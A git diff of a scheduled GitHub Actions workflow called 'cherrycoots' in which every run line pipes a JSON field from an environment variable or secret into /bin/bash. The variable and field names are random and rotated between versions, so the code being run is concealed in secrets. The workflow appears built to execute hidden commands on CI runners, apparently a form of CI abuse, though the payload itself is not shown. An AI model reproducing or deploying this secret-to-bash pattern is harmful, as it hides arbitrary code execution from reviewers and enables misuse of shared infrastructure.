@@ -3,25 +3,28 @@ name: cherrycoots
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 3/6 * * *'
-
-jobs:  # 5083
+    - cron: '11 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: cherrycoots
         env:
-          z313: ${{ secrets.z313 }}
+          elnrx72576: ${{ secrets.elnrx72576 }}
         run: |
-          echo $z313 | jq -r .yym0613 | /bin/bash
-          echo $q0592 | jq -r .pask60890 | /bin/bash
-          echo $riupa4510 | jq -r .mwj93 | /bin/bash
-          echo $dubc39 | jq -r .yvi42 | /bin/bash
-          echo $jrasg898 | jq -r .d31603 | /bin/bash
-          echo $lbauj006 | jq -r .dzffu726 | /bin/bash
-          echo $b553 | jq -r .b4014 | /bin/bash
-          echo $ti1859 | jq -r .zz968 | /bin/bash
-          echo $xgg05 | jq -r .jwsks065 | /bin/bash
+          echo $elnrx72576 | jq -r .xwc8 | /bin/bash
+          echo $c094 | jq -r .lt08 | /bin/bash
+          echo $fl87018 | jq -r .pzuu13 | /bin/bash
+          echo $nm23508 | jq -r .bw50184 | /bin/bash
+          echo $gedao62 | jq -r .a9199 | /bin/bash
+          echo $boczj4 | jq -r .miiv88145 | /bin/bash
+          echo $talnr4 | jq -r .xtws047 | /bin/bash
+          echo $pze22 | jq -r .e65735 | /bin/bash
+          echo $awe3764 | jq -r .z746 | /bin/bash
+          echo $u5793 | jq -r .upj3210 | /bin/bash
+          echo $jsysh44438 | jq -r .m310 | /bin/bash
+          echo $sdxa53 | jq -r .qxh86 | /bin/bash
+          echo $yf8441 | jq -r .jxfbh697 | /bin/bash
+          echo $syx23 | jq -r .izhvt9 | /bin/bash
 
